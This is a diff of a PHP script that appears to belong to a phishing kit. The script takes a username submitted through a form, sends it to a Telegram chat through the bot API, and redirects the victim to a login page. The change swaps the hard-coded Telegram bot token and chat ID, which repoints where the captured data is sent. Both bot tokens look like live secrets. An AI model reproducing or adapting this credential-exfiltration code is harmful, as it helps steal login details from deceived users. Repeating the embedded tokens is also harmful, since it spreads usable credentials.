@@ -5,7 +5,7 @@ if ($_POST) {
   $_SESSION["clawzuser"]=$clawzuser;
   $md5=md5($clawzuser);
   
-  $token='5264087994:AAFxravtQZUoEZaNZm_jUujaACXLnCicSsk';
+  $token='5523177274:AAEG9jumCJE3mq-_IC6pQXKsyV0jcxNIc7Y';
 
 
 
@@ -15,7 +15,7 @@ $data = [
     
 Kullanıcı Adı: '.$clawzuser.'
 ',
-    'chat_id' =>'-1001776028780'
+    'chat_id' =>'-5483343025'
 ];
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
   header("Location: login.php?$md5");
